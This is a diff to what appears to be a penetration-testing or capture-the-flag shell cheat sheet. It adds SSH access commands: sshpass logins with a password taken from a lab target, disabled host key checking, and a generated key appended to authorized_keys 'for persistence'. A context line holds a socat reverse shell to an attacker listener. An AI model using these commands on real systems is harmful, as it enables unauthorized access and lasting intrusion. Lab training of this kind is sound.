@@ -443,6 +443,44 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.13:9001
 expect -c "spawn /bin/bash; interact"
 ```
 
+---
+
+## SSH-Based Access
+
+### sshpass for Automated SSH Login
+```bash
+# Install sshpass
+sudo apt install sshpass
+
+# SSH with password (from extracted credentials)
+sshpass -p 'PlayerOftheMatch2022' ssh player@10.10.11.194
+
+# SSH with password from file
+echo 'password123' > /tmp/pass
+sshpass -f /tmp/pass ssh user@target
+
+# SSH with password and command execution
+sshpass -p 'password' ssh user@target 'whoami'
+
+# Disable host key checking for testing
+sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@target
+```
+
+### SSH Key-Based Access
+```bash
+# Use existing private key
+ssh -i /path/to/private_key user@target
+
+# SSH with specific key and no host checking
+ssh -i /path/to/key -o StrictHostKeyChecking=no user@target
+
+# Generate SSH key pair for persistence
+ssh-keygen -t rsa -f /tmp/key -N ""
+
+# Copy public key to target (if possible)
+cat /tmp/key.pub >> ~/.ssh/authorized_keys
+```
+
 ### Shell Enhancement
 ```bash
 # Set environment variables
